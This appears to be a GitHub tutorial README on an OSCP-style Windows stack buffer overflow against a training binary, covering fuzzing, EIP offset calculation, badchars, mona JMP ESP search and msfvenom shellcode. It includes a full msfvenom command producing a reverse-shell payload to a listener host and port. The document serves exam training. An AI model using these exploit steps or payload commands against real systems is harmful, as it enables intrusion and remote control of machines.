# OSCP-like-buffer-overflow
OSCP-like buffer overflow

* Immunity Debugger http://www.immunityinc.com/products/debugger/
* Mona.py https://github.com/corelan/mona

To avoid the error message saying "The program can't start because VCRUNTIME140.dll is missing from your computer", make sure whether you have the x86 version of Microsoft Visual C++ Redistributable preinstalled on your Windows virtual machine.
Once we've got everything prepared, we can fire up the Immunity Debugger and open our target binary.

## 1. Fuzzing the binary
Firstly, we can run the `hello.py` script to verify whether the application responds to us (not necessary)

Then we run the `fuzzer.py` script to identify the crashing point

## 2. Calculating the offset from stack pointer
After finding the crashing point, we will calculate the offset to the EIP address. Start with generating a string with the pattern_create.rb (/usr/share/metasploit-framework/tools/exploit/pattern_create.rb)
```
ruby pattern_create.rb -l 1024
```

Use the pattern_offset
```
ruby pattern_offset.rb -q 39653138
```

## Determining Badchars
In this particular case, the vulnerable function is *sprintf* (it handles strings). Given the fact that ASCII strings are terminated with a null-byte ("\x00"), we put it at the top of the list.
The newline character is used by handleConnection() to chunk the messages we send to it. 
So the starting point for our badchars is "\n" alternatively known as "\x0A"

To be sure that we haven't missed any other we will utilize our python script `badchars.py`.

To identify badchars we can also use `!mona bytearray`

## Identifying JMP ESP gadget
After determining the badchars of the application, we will go straight to identification of the JMP ESP that will be responsible for changing the natural flow of application to run our shellcode (which we will insert into the stack).

In assembly, the OPCODE for JMP ESP is `\xff\xe4`. Using mona we will locate the register in the application that points to this OPCODE. Thanks to that, we can change the flow o the application to run our shellcode, rewriting the stack from its base (EBP).

`!mona modules` to identify the unprotected modules

`!mona find -s "\xff\xe4"` to identify which of these pointers have the OPCODE for JMP ESP

Run `!mona jmp -r esp -cpb "\x00\x0A"` to identify which pointers do not have the badchars found.

At this point we might be in possesion of the correct JMP ESP address. If we want to check, we simply run `!mona find -s "\xff\xe4" -m dostackbufferoverflowgood.exe` directly on the identified vulnerable module.

## Generating shellcode
Now it's time to come up with some interesting bytecode to put on the stack. Metasploit has a built-in tool called msfvenom that can produce shellcode for us.
```
msfvenom -p windows/exec --list-options
```

![](https://raw.githubusercontent.com/d15rup7or/OSCP-like-buffer-overflow/master/img/msfvenom%20-p%20windowsexec%20--list-options.PNG)

For the purpose of the training, we will provide the following options to msfvenom:
* -p windows/exec (we want Windows shellcode that will execute a command)
* -b '\x00\x0A' (the list of bad characters we determined earlier, so that msfvenom can avoid having them in the generated shellcode
* -f python (output shellcode in a Python-friendly format)
* CMD=calc.exe EXITFUNC=thread (options for the windows/exec payload - in this case starting the calc.exe)

```
msfvenom -p windows/exec -b '\x00\x0A' \ -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
```

#### For reverse shell connection:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.21.128 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"
```
The shellcode contains machine code for a function that invokes a shell. The goal is to copy it into the buffer variable and then overwrite the return address

`EXITFUN=thread` preventes the shellcode from crashing the application when executing our shellcode

Now we just insert the msfvenom output in our exploit.py and run it against our application to gain access to the system exploiting the Buffer Overflow
